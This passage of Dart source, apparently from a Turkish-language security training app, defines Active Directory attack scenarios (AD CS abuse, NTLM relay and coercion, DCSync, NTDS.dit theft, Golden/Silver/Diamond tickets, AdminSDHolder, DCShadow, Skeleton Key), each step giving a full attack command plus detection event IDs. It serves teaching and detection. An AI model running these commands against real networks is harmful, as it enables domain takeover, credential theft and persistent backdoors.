        tool: 'Certipy req',
        command: r'certipy req -u user@domain.local -p Password123 -ca CA-NAME -template ESC3_AGENT_TEMPLATE',
        detection: 'CA Event ID 4887.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Aracı Sertifikası ile Administrator Adına Sertifika İsteme',
        tactic: 'Privilege Escalation',
        description: 'İlk sertifika imza yetkisi olarak sunularak Administrator adına ikinci şablondan sertifika çekilir.',
        tool: 'Certipy req on-behalf-of',
        command: r'certipy req -u user@domain.local -p Password123 -ca CA-NAME -template User -on-behalf-of domain\Administrator -pfx agent.pfx',
        detection: 'CA Event ID 4886 (Requester is Enrollment Agent).',
      ),
    ],
  ),

  // 16. AD CS ESC4 (Template DACL Abuse)
  AttackScenario(
    id: 'sc_adcs_esc4',
    title: 'AD CS ESC4: Şablon DACL Haklarını Değiştirip ESC1 Haline Getirme',
    difficulty: 'İleri Seviye',
    category: 'AD CS / Sertifika',
    description: 'Bir sertifika şablonu üzerinde WriteProperty veya GenericAll yetkisi olan saldırganın, şablonu ESC1 (Enrollee Supplies Subject) haline getirip ardından geri alması.',
    tags: ['AD CS', 'ESC4', 'Template Abuse', 'Certipy template'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Şablonu ESC1 Şablonuna Dönüştürme',
        tactic: 'Privilege Escalation & Persistence',
        description: 'Şablonun mS-PKI-Certificate-Name-Flag özniteliğine ENROLLEE_SUPPLIES_SUBJECT eklenir.',
        tool: 'Certipy template',
        command: r'certipy template -u user@domain.local -p Password123 -template VulnerableTemplate -save-old',
        detection: 'Event ID 5136 (CN=Certificate Templates altında nesne değişikliği).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'ESC1 İstismarı ve Şablonu Eski Haline Getirme',
        tactic: 'Defense Evasion',
        description: 'Administrator sertifikası alındıktan sonra şablon eski güvenli ayarlarına geri döndürülür.',
        tool: 'Certipy req & template',
        command: r'certipy template -u user@domain.local -p Password123 -template VulnerableTemplate -configuration VulnerableTemplate.json',
        detection: 'Event ID 5136 (Şablon geri yüklendi).',
      ),
    ],
  ),

  // 17. AD CS ESC8 (Web Enrollment NTLM Relay)
  AttackScenario(
    id: 'sc_adcs_esc8_petitpotam',
    title: 'AD CS ESC8: HTTP Web Enrollment NTLM Relay & PetitPotam',
    difficulty: 'İleri Seviye',
    category: 'AD CS / Sertifika',
    description: 'AD CS Web Kaydı (Web Enrollment) arayüzünün HTTP üzerinde NTLM authentication kullanmasını istismar ederek, PetitPotam ile tetiklenen DC bağlantısını relay edip DC sertifikası alma.',
    tags: ['AD CS', 'ESC8', 'PetitPotam', 'ntlmrelayx', 'NTLM Relay', 'Privilege Escalation'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'ntlmrelayx ile CA Web Enrollment Dinleyicisini Başlatma',
        tactic: 'Credential Access',
        description: 'AD CS HTTP web enrollment endpoint\'ine relay edilecek ve DomainController şablonu istenecektir.',
        tool: 'ntlmrelayx',
        command: r'impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController',
        detection: 'IIS Web Server HTTP 401 Unauthorized logları ve NTLM handshake.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'PetitPotam (MS-EFSR) ile DC\'den Kimlik Doğrulama Tetikleme',
        tactic: 'Lateral Movement',
        description: 'EfsRpcOpenFileRaw metodu çağrılarak DC\'nin saldırgan makinesine NTLM ile kimlik doğrulaması yapması sağlanır.',
        tool: 'petitpotam.py',
        command: r'python3 petitpotam.py 192.168.1.50 192.168.1.10',
        detection: 'Named Pipe \\pipe\\efsrpc veya \\pipe\\lsarpc bağlantısı.',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: r'Elde Edilen DC01$ Sertifikası ile TGT Alıp DCSync Yapma',
        tactic: 'Credential Access & Dominance',
        description: 'ntlmrelayx tarafından Base64 formatında verilen sertifika ile DC makine hesabı adına TGT alınır ve DCSync yapılır.',
        tool: 'Certipy auth / secretsdump',
        command: r'certipy auth -pfx dc01.pfx -dc-ip 192.168.1.10',
        detection: 'Event ID 4768 (PKINIT) ve Event ID 4662 (DCSync).',
      ),
    ],
  ),

  // 18. Certifried (CVE-2022-26923)
  AttackScenario(
    id: 'sc_certifried',
    title: 'Certifried (CVE-2022-26923): dNSHostName Sahteciliği ile DC Taklidi',
    difficulty: 'İleri Seviye',
    category: 'AD CS / Sertifika',
    description: 'Standart kullanıcının eklediği bilgisayar hesabının dNSHostName özniteliğini Domain Controller ile aynı yaparak CA\'den DC makine sertifikası çıkarma zafiyeti.',
    tags: ['Certifried', 'CVE-2022-26923', 'AD CS', 'dNSHostName', 'Certipy'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Sahte Bilgisayar Hesabı Ekleme',
        tactic: 'Resource Development',
        description: 'Standart kullanıcı haklarıyla etki alanına sahte makine hesabı katılır.',
        tool: 'Certipy account',
        command: r'certipy account create -u user@domain.local -p Password123 -account FAKEDC$ -password Password123!',
        detection: 'Event ID 4741 (A computer account was created).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'dNSHostName Özniteliğini DC01.domain.local Yapma',
        tactic: 'Privilege Escalation',
        description: 'Makine hesabının DNS adı gerçek Domain Controller\'ın FQDN\'i ile değiştirilir.',
        tool: 'Certipy account set',
        command: r'certipy account set -u user@domain.local -p Password123 -account FAKEDC$ -dns dc01.domain.local',
        detection: 'Event ID 5136 (Attribute: dNSHostName değiştirildi).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Machine Şablonundan DC01 Adına Sertifika Alma',
        tactic: 'Credential Access',
        description: 'CA, dNSHostName değerine bakarak gerçek Domain Controller zanneder ve sertifika basar.',
        tool: 'Certipy req',
        command: r'certipy req -u FAKEDC$ -p Password123! -ca CA-NAME -template Machine -dc-ip 192.168.1.10',
        detection: 'CA Event ID 4887 (Subject: dc01.domain.local).',
      ),
    ],
  ),

  // 19. GPO Abuse (SharpGPOAbuse)
  AttackScenario(
    id: 'sc_gpo_sharpgpoabuse',
    title: 'Grup İlkesi (GPO) İstismarı ile Tüm Ağa Yayılma',
    difficulty: 'İleri Seviye',
    category: 'Yetki Yükseltme',
    description: 'Bir GPO nesnesi üzerinde Edit/Write izinlerine sahip bir hesap ile OU\'ya bağlı tüm sunuculara zararlı Scheduled Task veya startup script dağıtarak SYSTEM yetkisi elde etme.',
    tags: ['GPO', 'SharpGPOAbuse', 'Lateral Movement', 'Persistence', 'Scheduled Task'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Zafiyetli GPO İzinlerinin Tespiti',
        tactic: 'Reconnaissance',
        description: 'Saldırgan kullanıcının yazma yetkisi bulunan GPO nesneleri taranır.',
        tool: 'PowerView',
        command: r"Get-DomainGPO -Permissions | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|GenericAll' }",
        detection: 'LDAP Event ID 1644.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'SharpGPOAbuse ile Gizli Zamanlanmış Görev Enjeksiyonu',
        tactic: 'Privilege Escalation & Persistence',
        description: 'Hedef GPO içerisine SYSTEM yetkisiyle ters bağlantı açacak bir Scheduled Task XML girdisi yazılır.',
        tool: 'SharpGPOAbuse.exe',
        command: r'SharpGPOAbuse.exe --AddComputerTask --TaskName "SecUpdate" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c powershell -enc <PAYLOAD>" --GPOName "Default Domain Policy"',
        detection: 'Event ID 5136 (GPO nesnesinde nTSecurityDescriptor / gPCMachineExtensionNames değişikliği).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Hedef Sistemlerde İlke Güncellemesini Bekleme veya Tetikleme',
        tactic: 'Execution',
        description: 'Windows istemcileri varsayılan olarak her 90 dakikada bir GPO günceller. İstendiğinde uzaktan zorlanabilir.',
        tool: 'gpupdate / gpresult',
        command: r'gpupdate /force',
        detection: 'Event ID 4698 (A scheduled task was created), Sysmon Event ID 1.',
      ),
    ],
  ),

  // 20. Shadow Credentials (msDS-KeyCredentialLink)
  AttackScenario(
    id: 'sc_shadow_credentials',
    title: 'Parolasız Ele Geçirme: Shadow Credentials (Whisker)',
    difficulty: 'Orta',
    category: 'Yetki Yükseltme',
    description: 'Hedef kullanıcı veya bilgisayar üzerinde GenericWrite veya WriteProperty yetkisi varsa, msDS-KeyCredentialLink özniteliğine X.509 sertifika anahtarı enjekte ederek parola değiştirmeden kimliğe bürünme.',
    tags: ['Shadow Credentials', 'pywhisker', 'PKINIT', 'msDS-KeyCredentialLink', 'Credential Access'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Zafiyetli ACE Yetkisinin Doğrulanması',
        tactic: 'Reconnaissance',
        description: 'Hedef bilgisayar hesabı üzerinde msDS-KeyCredentialLink yazma hakkı doğrulanır.',
        tool: 'PowerView / pywhisker',
        command: r"Get-DomainObjectAcl -Identity 'TargetPC$' | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite' }",
        detection: 'LDAP sorguları.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'pywhisker ile Sahte Sertifika Anahtarı Enjeksiyonu',
        tactic: 'Persistence & Privilege Escalation',
        description: 'Hedef nesnenin msDS-KeyCredentialLink özniteliğine yeni bir public key enjekte edilir ve private key yerel .pfx olarak kaydedilir.',
        tool: 'pywhisker.py',
        command: r'pywhisker.py -d domain.local -u user -p pass --target TargetPC$ --action add',
        detection: 'Event ID 5136 (Attribute: msDS-KeyCredentialLink, Operation: Value Added).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'PKINIT ile TGT Talebi ve Hedefin NTLM Hash Çıkarımı',
        tactic: 'Credential Access',
        description: 'Enjekte edilen sertifika ile KDC üzerinden Kerberos PKINIT oturumu açılır ve U2U ile NT hash elde edilir.',
        tool: 'gettgtpkinit.py',
        command: r'python3 gettgtpkinit.py domain.local/TargetPC$ -cert-pfx TargetPC.pfx -pfx-pass password out.ccache',
        detection: 'Event ID 4768 (Pre-Authentication Type: 16 PKINIT).',
      ),
    ],
  ),

  // 21. KrbRelayUp ile Yerel Yetki Yükseltme
  AttackScenario(
    id: 'sc_krbrelayup',
    title: 'KrbRelayUp ile Yerel Kullanıcıdan SYSTEM Yetkisine Sıçrama',
    difficulty: 'İleri Seviye',
    category: 'Yetki Yükseltme',
    description: 'Yerel Kerberos kimlik doğrulamasını LDAP ve RBCD ile birleştirerek, hiçbir yönetici parolası olmadan yerel standart kullanıcıdan NT AUTHORITY\\SYSTEM yetkisi alma.',
    tags: ['KrbRelayUp', 'Local Privilege Escalation', 'RBCD', 'Kerberos Relay'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'KrbRelayUp Tam Otomasyon Saldırısını Başlatma',
        tactic: 'Privilege Escalation',
        description: 'Araç sahte makine hesabı ekler, yerel makinenin RBCD özniteliğini günceller ve S4U bileti alıp SYSTEM komutu çalıştırır.',
        tool: 'KrbRelayUp.exe',
        command: r'KrbRelayUp.exe relay -d domain.local -cn FAKECOMP$',
        detection: 'Event ID 4741 (Computer created), Event ID 5136 (msDS-AllowedToActOnBehalfOfOtherIdentity).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'SYSTEM Olarak Yeni Süreç Başlatma',
        tactic: 'Execution',
        description: 'Alınan Kerberos biletiyle Service Control Manager üzerinden SYSTEM olarak cmd.exe veya beacon başlatılır.',
        tool: 'KrbRelayUp spawn',
        command: r'KrbRelayUp.exe spawn',
        detection: 'Event ID 7045 (A new service was installed), Sysmon Event ID 1.',
      ),
    ],
  ),

  // 22. DFSCoerce / ShadowCoerce
  AttackScenario(
    id: 'sc_coercion_dfscoerce',
    title: 'DFSCoerce & ShadowCoerce ile DC Kimlik Doğrulama Zorlama',
    difficulty: 'Orta',
    category: 'NTLM & Relay',
    description: 'MS-DFSNM (Distributed File System) ve MS-FSRVP (File Server Remote VSS) RPC protokolleri üzerinden Domain Controller\'ı saldırgan sunucusuna zorla bağlama.',
    tags: ['DFSCoerce', 'ShadowCoerce', 'Coercion', 'RPC', 'MS-DFSNM'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'NetrDfsAddStdRoot ile DC Bağlantısını Tetikleme',
        tactic: 'Credential Access',
        description: 'DC\'nin DFS RPC servisi tetiklenerek saldırganın dinleyici IP\'sine NTLM kimlik doğrulaması göndermesi sağlanır.',
        tool: 'dfscoerce.py',
        command: r'python3 dfscoerce.py -u user -p pass -d domain.local 192.168.1.50 192.168.1.10',
        detection: 'Named pipe: \\pipe\\netdfs bağlantısı, Event ID 5145.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Gelen Bağlantıyı AD CS veya LDAP\'a Relay Etme',
        tactic: 'Lateral Movement',
        description: r'Gelen DC01$ bağlantısı ntlmrelayx ile AD CS Web Enrollment arayüzüne yönlendirilir.',
        tool: 'ntlmrelayx',
        command: r'impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs',
        detection: 'Web Server HTTP 401 & NTLM handshake logları.',
      ),
    ],
  ),

  // 23. DCSync ile DRSUAPI Replikasyonu
  AttackScenario(
    id: 'sc_dcsync',
    title: 'DCSync ile Domain Controller Replikasyonu ve Tüm Parola Hasadı',
    difficulty: 'Orta',
    category: 'Kalıcılık & DC',
    description: 'Domain Controller üzerinde kod çalıştırmadan veya dosya bırakmadan, DRSUAPI Replikasyon protokolünü taklit ederek uzaktan KRBTGT ve tüm kullanıcıların parola hash\'lerini çekme.',
    tags: ['DCSync', 'DRSUAPI', 'KRBTGT', 'Mimikatz', 'secretsdump'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Replication Haklarının Doğrulanması',
        tactic: 'Reconnaissance',
        description: 'Mevcut kullanıcının DS-Replication-Get-Changes ve DS-Replication-Get-Changes-All izinleri teyit edilir.',
        tool: 'PowerView',
        command: r'Get-DomainObjectAcl -Identity "DC=domain,DC=local" | Where-Object { $_.ActiveDirectoryRights -match "DS-Replication" }',
        detection: 'LDAP Event ID 1644.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'secretsdump ile KRBTGT ve Administrator Hash\'lerini Çekme',
        tactic: 'Credential Access',
        description: 'Uzaktan DRSUAPI GetNCChanges çağrısı yapılarak tüm domain NTLM hash\'leri dökülür.',
        tool: 'impacket-secretsdump',
        command: r'impacket-secretsdump -just-dc domain.local/admin_user:Pass123@192.168.1.10',
        detection: 'Event ID 4662 (Access Mask: 0x100 DS-Replication-Get-Changes-All).',
      ),
    ],
  ),

  // 24. NTDS.dit Volume Shadow Copy
  AttackScenario(
    id: 'sc_ntds_vss',
    title: 'Volume Shadow Copy (VSS) ile Kilitli NTDS.dit ve SYSTEM Kovanı Hasadı',
    difficulty: 'Orta',
    category: 'Kalıcılık & DC',
    description: 'Aktif kullanımda kilitli olan NTDS.dit veritabanının Volume Shadow Copy servisi veya ntdsutil ile anlık kopyasını alıp çevrimdışı tüm etki alanı hash\'lerini çıkarma.',
    tags: ['NTDS.dit', 'VSS', 'ntdsutil', 'Credential Access', 'Dominance'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Volume Shadow Copy ile C: Sürücüsü Anlık Görüntüsü Alma',
        tactic: 'Credential Access',
        description: 'VSS anlık görüntüsü oluşturularak kilitli dosyalara salt okunur erişim sağlanır.',
        tool: 'vssadmin / copy',
        command: r'vssadmin create shadow /for=C: && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit',
        detection: 'Event ID 7036 (Volume Shadow Copy Service entered running state), Event ID 4688.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'SYSTEM Registry Kovanını Dışa Aktarma',
        tactic: 'Credential Access',
        description: 'Veritabanı şifreleme anahtarını içeren SYSTEM kovanı dışa aktarılır.',
        tool: 'reg save',
        command: r'reg save HKLM\SYSTEM C:\temp\SYSTEM',
        detection: 'Event ID 4688 (reg.exe save HKLM\\SYSTEM).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Çevrimdışı Tüm Domain Parola Hash\'lerini Dökme',
        tactic: 'Credential Access',
        description: 'İki dosya birleştirilerek tüm kullanıcıların LM, NTLM ve Kerberos anahtarları elde edilir.',
        tool: 'impacket-secretsdump',
        command: r'impacket-secretsdump -ntds C:\temp\ntds.dit -system C:\temp\SYSTEM LOCAL',
        detection: 'Tamamen çevrimdışı işlem (Ağda iz bırakmaz).',
      ),
    ],
  ),

  // 25. Golden Ticket
  AttackScenario(
    id: 'sc_golden_ticket',
    title: 'Kalıcılık: Golden Ticket (Sahte TGT) ile Sınırsız Hakimiyet',
    difficulty: 'İleri Seviye',
    category: 'Kalıcılık & DC',
    description: 'Elde edilen KRBTGT NTLM hash\'i ile 10 yıl süreli ve istenen herhangi bir kullanıcı kimliğine (Enterprise Admin) bürünebilen sahte Kerberos TGT üretme.',
    tags: ['Golden Ticket', 'Kerberos', 'KRBTGT', 'Persistence', 'Mimikatz'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'KRBTGT Hash ve Domain SID Bilgisinin Tespiti',
        tactic: 'Credential Access',
        description: 'Golden Ticket oluşturmak için gerekli olan Domain SID ve KRBTGT NTLM hash\'i DCSync ile alınır.',
        tool: 'mimikatz / secretsdump',
        command: r'mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt',
        detection: 'Event ID 4662 (DS-Replication-Get-Changes-All).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Golden Ticket (Sahte TGT) Üretme',
        tactic: 'Persistence & Defense Evasion',
        description: 'İstenen kullanıcı adı ve Domain Admins (512), Enterprise Admins (519) grup SID\'leri ile sahte bilet basılır.',
        tool: 'mimikatz kerberos::golden',
        command: r'mimikatz # kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-123456789 /krbtgt:<NTLM_HASH> /id:500 /groups:512,513,518,519 /ticket:golden.kirbi',
        detection: 'Event ID 4672 (Özel ayrıcalıklar atandı).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Bileti Belleğe Yükleyerek Yönetici Oturumu Açma',
        tactic: 'Lateral Movement',
        description: 'Oluşturulan bilet mevcut oturuma enjekte edilir ve parola girmeksizin erişim sağlanır.',
        tool: 'mimikatz kerberos::ptt',
        command: r'mimikatz # kerberos::ptt golden.kirbi',
        detection: 'Event ID 4624 (Logon Type 3 Kerberos).',
      ),
    ],
  ),

  // 26. Silver Ticket
  AttackScenario(
    id: 'sc_silver_ticket',
    title: 'Kalıcılık: Silver Ticket ile KDC Temassız Servis Bilet Sahteciliği',
    difficulty: 'İleri Seviye',
    category: 'Kalıcılık & DC',
    description: 'Hedef sunucunun makine hesabı hash\'ini kullanarak, KDC (Domain Controller) ile hiçbir temas kurmaksızın doğrudan o sunucudaki CIFS, WMI veya HTTP servisleri için sahte TGS basma.',
    tags: ['Silver Ticket', 'Kerberos', 'TGS', 'Persistence', 'Stealth'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Hedef Sunucunun Makine Parola Hash\'ini Elde Etme',
        tactic: 'Credential Access',
        description: 'Hedef makinenin LSA Secrets veya SAM veritabanından makine hesabı NT hash\'i çekilir.',
        tool: 'secretsdump.py',
        command: r'python3 secretsdump.py -sam sam.save -system system.save LOCAL',
        detection: 'Sysmon Event ID 10.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'CIFS Servisi İçin Silver Ticket Üretme',
        tactic: 'Persistence & Defense Evasion',
        description: 'Hedef sunucunun NT hash\'i ile Administrator adına imzalanmış sahte TGS oluşturulur.',
        tool: 'mimikatz kerberos::silver',
        command: r'mimikatz # kerberos::silver /domain:domain.local /sid:S-1-5-21-123456789 /target:dc01.domain.local /service:cifs /rc4:<MACHINE_HASH> /user:Administrator /ticket:silver.kirbi',
        detection: 'DC Event loglarında TGT kaydı olmaksızın sunucuya sunulan TGS bağlantısı.',
      ),
    ],
  ),

  // 27. Diamond & Sapphire Ticket
  AttackScenario(
    id: 'sc_diamond_sapphire_ticket',
    title: 'Tespit Edilemez Kalıcılık: Diamond & Sapphire Ticket',
    difficulty: 'İleri Seviye',
    category: 'Kalıcılık & DC',
    description: 'Golden Ticket anomalilerini atlatmak için KDC\'den tamamen meşru bir TGT talep edip, ardından yalnızca bilet içindeki PAC kısmını KRBTGT hash\'i ile güncelleyerek enjekte etme.',
    tags: ['Diamond Ticket', 'Sapphire Ticket', 'Kerberos', 'Rubeus diamond', 'OPSEC'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Meşru Kullanıcı Adına KDC\'den Gerçek TGT İsteme',
        tactic: 'Credential Access',
        description: 'Standart kullanıcı adına KDC\'den geçerli bir TGT talep edilir.',
        tool: 'Rubeus diamond',
        command: r'Rubeus.exe diamond /user:jdoe /password:Pass123 /domain:domain.local /dc:dc01.domain.local /krbtgt:<KRBTGT_HASH> /groups:512,519 /ticketuser:Administrator /ptt',
        detection: 'Event ID 4768 (KDC tarafından meşru şifreleme ve bilet numarası ile üretilmiş TGT).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'PAC Alanını Domain Admins ile Sessizce Değiştirme',
        tactic: 'Defense Evasion',
        description: 'TGT\'nin gövdesi orijinal kalırken sadece yetki alanları güncellenir; SIEM kuralları alarm vermez.',
        tool: 'Rubeus',
        command: r'# Bilet otomatik olarak mevcut oturuma enjekte edilir (ptt)',
        detection: 'Event ID 4672.',
      ),
    ],
  ),

  // 28. AdminSDHolder & SDProp
  AttackScenario(
    id: 'sc_adminsdholder_sdprop',
    title: 'Sinsi Kalıcılık: AdminSDHolder & SDProp Arka Kapısı',
    difficulty: 'İleri Seviye',
    category: 'Kalıcılık & DC',
    description: 'Her 60 dakikada bir korumalı grupların (Domain Admins, Enterprise Admins vb.) izinlerini eşitleyen AdminSDHolder objesine arka kapı ACE\'i ekleyerek yetki temizlense dahi kalıcı kalma.',
    tags: ['AdminSDHolder', 'SDProp', 'Persistence', 'ACL', 'Backdoor'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'AdminSDHolder Objesine Standart Hesap İçin GenericAll Ekleme',
        tactic: 'Persistence',
        description: 'CN=AdminSDHolder konteynerine standart saldırgan hesabı için GenericAll ACE girdisi yazılır.',
        tool: 'PowerView Add-DomainObjectAcl',
        command: r"Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity 'attacker_user' -Rights All",
        detection: 'Event ID 5136 (CN=AdminSDHolder objesinde nTSecurityDescriptor değişikliği).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'SDProp Sürecinin Otomatik Çalışmasını Bekleme',
        tactic: 'Persistence',
        description: 'LSASS içerisindeki SDProp iş parçacığı her 60 dakikada bir çalışarak AdminSDHolder izinlerini tüm korumalı hesaplara aktarır.',
        tool: 'SDProp Process (Windows Native)',
        command: r'# 60 dakika içinde veya DC yeniden başlatıldığında LSASS tarafından tetiklenir',
        detection: 'Event ID 5136 (Domain Admins ve diğer korumalı grupların DACL güncellemeleri).',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Eşitlenen İzin ile Domain Admin Parolasını Sıfırlama',
        tactic: 'Privilege Escalation',
        description: 'SDProp sonrası saldırgan hesabı korumalı tüm hesaplar üzerinde tam kontrol kazanır.',
        tool: 'net user',
        command: r'net user Administrator BackdoorPass123! /domain',
        detection: 'Event ID 4724 (An attempt was made to reset an account\'s password).',
      ),
    ],
  ),

  // 29. DCShadow ile Logsuz Değişiklik
  AttackScenario(
    id: 'sc_dcshadow',
    title: 'DCShadow ile SIEM Loglarını Atlatarak Sahte DC Replikasyonu',
    difficulty: 'İleri Seviye',
    category: 'Kalıcılık & DC',
    description: 'Saldırgan makinesini geçici olarak sahte bir Domain Controller gibi tanıtarak (RPC DRSUAPI), Event ID 5136 gibi nesne değişiklik logları üretmeden Active Directory objelerine arka kapı enjekte etme.',
    tags: ['DCShadow', 'Mimikatz', 'Persistence', 'Stealth', 'Defense Evasion'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Birinci Terminalde Değişiklik Parametrelerini Belirleme',
        tactic: 'Persistence & Defense Evasion',
        description: 'Hedef kullanıcıya sidHistory eklemek veya nTSecurityDescriptor değiştirmek üzere komut girilir.',
        tool: 'mimikatz dcshadow',
        command: r'mimikatz # lsadump::dcshadow /object:attacker_user /attribute:primaryGroupID /value:512',
        detection: 'RPC port (135) üzerinden DRSUAPI kayıtları, SPN kaydı.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'İkinci Terminalde Replikasyonu Tetikleme',
        tactic: 'Execution',
        description: 'Replikasyon zorlanır ve gerçek DC nesne değişikliğini sahte DC\'den çekerek kaydeder.',
        tool: 'mimikatz dcshadow push',
        command: r'mimikatz # lsadump::dcshadow /push',
        detection: 'Event ID 4662 (DC replikasyon izi; ancak standart Active Directory logları üretilmez).',
      ),
    ],
  ),

  // 30. DSRM Parola İstismarı
  AttackScenario(
    id: 'sc_dsrm_backdoor',
    title: 'DSRM (Directory Services Restore Mode) Parola İstismarı',
    difficulty: 'Orta',
    category: 'Kalıcılık & DC',
    description: 'DC kurulumunda belirlenen ve unutulan DSRM yerel yönetici parolasını sıfırlayıp, kayıt defteri ayarıyla DC üzerinde kalıcı yerel yönetici erişimi elde etme.',
    tags: ['DSRM', 'Backdoor', 'Persistence', 'Pass-the-Hash'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'DSRM Oturum Açma Davranışını Kayıt Defterinde Değiştirme',
        tactic: 'Persistence',
        description: 'DSRM hesabının yalnızca kurtarma modunda değil, normal çalışırken de ağdan oturum açmasına izin verilir (DsrmAdminLogonBehavior=2).',
        tool: 'reg add',
        command: r'reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f',
        detection: 'Sysmon Event ID 13 (Registry value set: DsrmAdminLogonBehavior).',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'DSRM Parola Hash\'ini Bilinen Bir Hash ile Eşitleme',
        tactic: 'Credential Access',
        description: 'DSRM parolası ntdsutil veya Mimikatz ile istenen bir NT hash değerine kilitlenir.',
        tool: 'ntdsutil / mimikatz',
        command: r'ntdsutil "set dsrm password" "reset password on server null" q q',
        detection: 'Event ID 4794 (An attempt was made to set the Directory Services Restore Mode administrator password).',
      ),
    ],
  ),

  // 31. Skeleton Key Master Parola
  AttackScenario(
    id: 'sc_skeleton_key',
    title: 'Skeleton Key: DC LSASS Belleğine Master Parola Enjekte Etme',
    difficulty: 'İleri Seviye',
    category: 'Kalıcılık & DC',
    description: 'Domain Controller\'ın LSASS sürecine yama yaparak etki alanındaki tüm hesaplar için geçerli gizli bir anahtar parola (varsayılan: mimikatz) enjekte etme.',
    tags: ['Skeleton Key', 'Mimikatz', 'Persistence', 'LSASS Patching'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'DC Üzerinde Mimikatz misc::skeleton Enjeksiyonu',
        tactic: 'Persistence & Defense Evasion',
        description: 'Domain Controller lsass.exe bellek alanındaki Kerberos doğrulama fonksiyonu yamalanır.',
        tool: 'mimikatz misc::skeleton',
        command: r'mimikatz # privilege::debug && misc::skeleton',
        detection: 'Sysmon Event ID 10 (ProcessAccess to lsass.exe), Event ID 7045.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Herhangi Bir Kullanıcı Adına Master Parola ile Giriş',
        tactic: 'Credential Access',
        description: 'Kullanıcının gerçek parolası değişmeden kalırken, "mimikatz" parolasıyla oturum açılabilir.',
        tool: 'NetExec',
        command: r'nxc smb 192.168.1.50 -u Administrator -p "mimikatz"',
        detection: 'Event ID 4624 (Logon Type 3 NTLM / Kerberos fallback).',
      ),
    ],
  ),

  // 32. Forest Trust & SID History Enjeksiyonu
  AttackScenario(
    id: 'sc_trust_sid_history',
    title: 'Orman Güveni (Forest Trust) İstismarı: SID History Enjeksiyonu',
    difficulty: 'İleri Seviye',
    category: 'Trust & Hibrit',
    description: 'Çocuk domainden ebeveyn root domaine (veya iki yönlü orman güveninde) SID filtering kapalıyken Golden Ticket içerisine Enterprise Admins (SID 519) ekleyerek orman genelinde tam kontrol kazanma.',
    tags: ['Trust Abuse', 'SID History', 'Enterprise Admins', 'Forest Compromise', 'Golden Ticket'],
    steps: [
      ScenarioStep(
        stepNumber: 1,
        title: 'Domain ve Forest Trust İlişkilerini Haritalama',
        tactic: 'Reconnaissance',
        description: 'Mevcut domainin bağlı olduğu child/parent ve orman güven ilişkileri sorgulanır.',
        tool: 'PowerView Get-DomainTrust',
        command: r'Get-DomainTrust -Domain domain.local',
        detection: 'LDAP Event ID 1644.',
      ),
      ScenarioStep(
        stepNumber: 2,
        title: 'Root Domain SID ve Enterprise Admins Bilgisini Alma',
        tactic: 'Reconnaissance',
        description: 'Hedef root domainin SID değeri ve Enterprise Admins grubu (RID 519) belirlenir.',
        tool: 'PowerView Get-DomainSID',
        command: r'Get-DomainSID -Domain rootdomain.local',
        detection: 'LDAP sorguları.',
      ),
      ScenarioStep(
        stepNumber: 3,
        title: 'Çocuk Domain KRBTGT ile SID History İçeren Golden Ticket Üretme',
        tactic: 'Privilege Escalation & Lateral Movement',
        description: 'Çocuk domainin KRBTGT hash\'i kullanılarak sids parametresine Root Domain Enterprise Admins SID\'i enjekte edilir.',
        tool: 'mimikatz kerberos::golden',
        command: r'mimikatz # kerberos::golden /user:Administrator /domain:child.rootdomain.local /sid:S-1-5-21-CHILD /krbtgt:<CHILD_KRBTGT> /sids:S-1-5-21-ROOT-519 /ticket:trust_golden.kirbi',
